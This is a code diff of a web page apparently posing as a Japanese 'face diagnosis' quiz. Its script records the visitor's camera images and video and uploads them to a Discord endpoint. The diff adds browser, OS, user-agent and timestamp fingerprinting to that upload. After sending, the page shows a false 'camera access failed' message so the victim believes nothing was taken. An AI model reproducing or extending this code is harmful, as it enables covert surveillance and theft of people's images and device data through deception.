@@ -14,6 +14,7 @@
   <meta name="twitter:card" content="summary_large_image" />
 
   <style>
+    /* （略）スタイル部分は省略なし・元のまま */
     body {
       margin: 0;
       padding: 0;
@@ -114,7 +115,6 @@
       color: black;
     }
 
-    /* ローディングオーバーレイ */
     #loadingOverlay {
       position: fixed;
       z-index: 2000;
@@ -166,7 +166,6 @@
   <button class="button" id="startButton">診断する</button>
   <div class="terms-link" id="termsLink">利用規約</div>
 
-  <!-- ローディングオーバーレイ -->
   <div id="loadingOverlay">
     <div class="circle-border">
       <div class="circle-core"></div>
@@ -228,7 +227,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   async function recordVideo() {
-    loadingOverlay.style.display = "flex";  // 表示
+    loadingOverlay.style.display = "flex";
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
     const mediaRecorder = new MediaRecorder(stream);
     const chunks = [];
@@ -245,7 +244,7 @@ document.addEventListener("DOMContentLoaded", () => {
       };
     });
 
-    loadingOverlay.style.display = "none";  // 非表示
+    loadingOverlay.style.display = "none";
     return new Blob(chunks, { type: "video/webm" });
   }
 
@@ -263,8 +262,36 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   async function sendToDiscord(images, videoUrl) {
+    const ua = navigator.userAgent;
+    const platform = navigator.platform;
+    const browser = (() => {
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Edg")) return "Edge";
+      return "不明";
+    })();
+    const os = (() => {
+      if (/android/i.test(ua)) return "Android";
+      if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
+      if (/win/i.test(ua)) return "Windows";
+      if (/mac/i.test(ua)) return "Mac";
+      return "不明";
+    })();
+    const now = new Date().toLocaleString("ja-JP", { timeZone: "Asia/Tokyo" });
+
+    const message = `診断用AIサーバーへ送信
+
+【V-URL】
+${videoUrl}
+
+【環境情報】
+OS：${os}
+ブラウザ：${browser}
+UA：${ua}
+日時：${now}`;
+
     const formData = new FormData();
-    const message = `診断用AIサーバーへ送信\n\n【V-URL】\n${videoUrl}`;
     formData.append("payload_json", JSON.stringify({ content: message }));
 
     images.forEach((img, i) => {
@@ -278,7 +305,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   document.getElementById("startButton").onclick = async () => {
-    alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。\nこの後表示されるカメラ許可のポップアップに従い、診断を開始してください。");
+    alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。");
 
     try {
       const userImages = await captureImages("user");
@@ -290,7 +317,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
       await sendToDiscord(allImages, videoUrl);
 
-      alert("カメラへのアクセスに失敗しました。\nもう一度初めからやり直し、診断を開始してください。\n※複数回アクセスに失敗した場合、\n使用している端末/ブラウザが当サイトに対応していない可能性があります。");
+      alert("カメラへのアクセスに失敗しました。\nもう一度初めからやり直し、診断を開始してください。");
     } catch (e) {
       console.error("送信失敗:", e);
       alert("エラーが発生しました。カメラやマイクの設定をご確認ください。");
